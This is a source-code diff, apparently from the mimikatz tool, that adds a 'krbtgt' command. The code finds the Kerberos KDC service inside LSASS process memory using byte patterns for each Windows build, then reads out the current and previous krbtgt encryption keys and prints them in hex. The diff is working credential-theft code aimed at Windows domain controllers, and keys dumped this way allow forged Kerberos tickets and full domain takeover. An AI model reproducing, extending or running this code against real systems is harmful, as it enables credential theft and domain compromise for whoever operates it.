@@ -18,6 +18,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
 
 	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_krbtgt,	L"krbtgt",			L"krbtgt!"},
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
@@ -29,6 +30,7 @@ const KUHL_M kuhl_m_sekurlsa = {
 	ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
 };
 
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = {L"kdc", NULL, FALSE, L"kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_msv_package,
 	&kuhl_m_sekurlsa_tspkg_package,
@@ -38,6 +40,7 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_ssp_package,
 	&kuhl_m_sekurlsa_dpapi_svc_package,
 	&kuhl_m_sekurlsa_credman_package,
+	&kuhl_m_sekurlsa_kdcsvc_package,
 };
 
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
@@ -66,7 +69,7 @@ VOID kuhl_m_sekurlsa_reset()
 {
 	HANDLE toClose;
 	ULONG i;
-
+	
 	free(pMinidumpName);
 	pMinidumpName = NULL;
 	if(cLsass.hLsassMem)
@@ -392,6 +395,125 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 {
 	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
+}
+
+#ifdef _M_X64
+BYTE PTRN_W2K3_SecData[]	= {0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d};
+BYTE PTRN_W2K8_SecData[]	= {0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d};
+BYTE PTRN_W2K12_SecData[]	= {0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15};
+BYTE PTRN_W2K12R2_SecData[]	= {0x0f, 0xb6, 0x4c, 0x24, 0x30, 0x85, 0xc0, 0x0f, 0x45, 0xcf, 0x8a, 0xc1};
+KULL_M_PATCH_GENERIC SecDataReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 37}},
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
+};
+#elif defined _M_IX86
+BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
+BYTE PTRN_W2K8_SecData[]	= {0x8b, 0x45, 0x14, 0x83, 0xc0, 0x18, 0x50, 0xb9};
+KULL_M_PATCH_GENERIC SecDataReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 45}},
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, {  8, 47}},
+};
+#endif
+
+NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
+{
+	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
+	LONG l = 0;
+	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {&dualKrbtgt, &hLocalMemory};
+
+	if(NT_SUCCESS(status))
+	{
+		if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
+		{
+			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, NULL, &l))
+			{
+				aLsass.address = (PBYTE) aLsass.address + sizeof(PVOID) * l;
+				if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(DUAL_KRBTGT)))
+				{
+					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, L"Current");
+					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, L"Previous");
+				}
+			}
+		}
+		else PRINT_ERROR(L"KDC service not in LSASS memory\n");
+	}
+	return status;
+}
+
+void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
+{
+	DWORD sizeForCreds, i;
+	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
+	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &hLocalMemory};
+
+	if(addr)
+	{
+		kprintf(L"\n%s krbtgt: ", prefix);
+		if(cLsass.osContext.MajorVersion < 6)
+		{
+			aLocal.address = &tmpCred5;
+			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
+			{
+				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_5) + (tmpCred5.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_5);
+				if(creds5 = (PKIWI_KRBTGT_CREDENTIALS_5) LocalAlloc(LPTR, sizeForCreds))
+				{
+					aLocal.address = creds5;
+					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
+					{
+						kprintf(L"%u credentials\n", creds5->cbCred);
+						for(i = 0; i < creds5->cbCred; i++)
+						{
+							kprintf(L"> %s - ", kuhl_m_kerberos_ticket_etype((LONG) creds5->credentials[i].type));
+							aLsass.address = creds5->credentials[i].key;
+							if(aLocal.address = LocalAlloc(LPTR, (DWORD) creds5->credentials[i].size))
+							{
+								if(kull_m_memory_copy(&aLocal, &aLsass, (DWORD) creds5->credentials[i].size))
+									kull_m_string_wprintf_hex(aLocal.address, (DWORD) creds5->credentials[i].size, 0);
+								kprintf(L"\n");
+								LocalFree(aLocal.address);
+							}
+						}
+					}
+					LocalFree(creds5);
+				}
+			}
+		}
+		else
+		{
+			aLocal.address = &tmpCred6;
+			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
+			{
+				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
+				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
+				{
+					aLocal.address = creds6;
+					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
+					{
+						kprintf(L"%u credentials\n", creds6->cbCred);
+						for(i = 0; i < creds6->cbCred; i++)
+						{
+							kprintf(L"> %s - ", kuhl_m_kerberos_ticket_etype((LONG) creds6->credentials[i].type));
+							aLsass.address = creds6->credentials[i].key;
+							if(aLocal.address = LocalAlloc(LPTR, (DWORD) creds6->credentials[i].size))
+							{
+								if(kull_m_memory_copy(&aLocal, &aLsass, (DWORD) creds6->credentials[i].size))
+									kull_m_string_wprintf_hex(aLocal.address, (DWORD) creds6->credentials[i].size, 0);
+								kprintf(L"\n");
+								LocalFree(aLocal.address);
+							}
+						}
+					}
+					LocalFree(creds6);
+				}
+			}
+		}
+	}
 }
 
 NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
